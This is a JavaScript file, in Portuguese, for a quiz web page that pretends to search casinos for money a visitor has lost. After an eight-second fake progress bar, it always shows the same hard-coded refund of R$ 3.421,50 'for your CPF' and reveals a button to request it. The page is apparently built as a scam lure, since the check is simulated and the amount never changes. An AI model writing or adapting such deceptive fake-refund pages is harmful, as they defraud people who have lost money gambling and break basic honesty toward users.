document.addEventListener("DOMContentLoaded", function () {
  // Controle do quiz
  function next(current, next) {
    document.getElementById(current).classList.remove("active");
    document.getElementById(current).classList.add("hidden");
    document.getElementById(next).classList.remove("hidden");
    document.getElementById(next).classList.add("active");
  }

  window.next = next; // Expõe globalmente para onclick funcionar

  // Verificação de nome no final
  const botao = document.getElementById("verificar");
  if (botao) {
    botao.addEventListener("click", function () {
      const nome = document.getElementById("nome").value.trim();
      if (nome.length < 5) {
        alert("Por favor, digite seu nome completo.");
        return;
      }

      botao.style.display = "none";

      const container = document.querySelector(".container.verificacao");

      // Criação dos elementos
      const progressWrapper = document.createElement("div");
      const barra = document.createElement("div");
      const progressoTexto = document.createElement("p");
      const porcentagemTexto = document.createElement("span");

      progressWrapper.style.position = "relative";
      progressWrapper.style.width = "100%";
      progressWrapper.style.backgroundColor = "#ddd";
      progressWrapper.style.borderRadius = "8px";
      progressWrapper.style.overflow = "hidden";
      progressWrapper.style.marginTop = "20px";
      progressWrapper.style.height = "20px";
      progressWrapper.id = "barra-container"; // ID pra sumir depois

      barra.style.width = "0%";
      barra.style.height = "100%";
      barra.style.backgroundColor = "#2e7d32";
      barra.style.transition = "width 0.4s ease";

      porcentagemTexto.style.position = "absolute";
      porcentagemTexto.style.right = "10px";
      porcentagemTexto.style.top = "50%";
      porcentagemTexto.style.transform = "translateY(-50%)";
      porcentagemTexto.style.fontSize = "12px";
      porcentagemTexto.style.color = "#000";
      porcentagemTexto.style.fontWeight = "bold";

      progressoTexto.style.fontSize = "13px";
      progressoTexto.style.color = "#666";
      progressoTexto.style.marginTop = "10px";

      progressWrapper.appendChild(barra);
      progressWrapper.appendChild(porcentagemTexto);
      container.appendChild(progressWrapper);
      container.appendChild(progressoTexto);

      let progresso = 0;
      const intervalo = setInterval(() => {
        progresso += 1;
        barra.style.width = progresso + "%";
        porcentagemTexto.textContent = progresso + "%";

        if (progresso <= 40) {
          progressoTexto.textContent = "Verificando seu nome nos cassinos...";
        } else if (progresso <= 70) {
          progressoTexto.textContent = "Verificando valor que você perdeu...";
        } else if (progresso < 100) {
          progressoTexto.textContent = "Finalizando a consulta em seu nome...";
        }

        if (progresso >= 100) {
          clearInterval(intervalo);

          // Remove tudo da barra
          progressoTexto.remove();
          porcentagemTexto.remove();

          // Esconde a barra completa
          progressWrapper.style.display = "none";

          // Mostra resultado
          const valorFixo = "3.421,50";
          const mensagem = `${nome}, encontramos exatamente R$ ${valorFixo} em reembolso disponível para seu CPF.`;
          const mensagemBox = document.getElementById("mensagem");
          mensagemBox.textContent = mensagem;
          mensagemBox.style.display = "block";

          const btnSolicitar = document.getElementById("btn-solicitar");
          if (btnSolicitar) btnSolicitar.style.display = "inline-block";

          document.getElementById("resultadoBox").classList.remove("hidden");
        }
      }, 80); // Total ~8 segundos
    });
  }
});
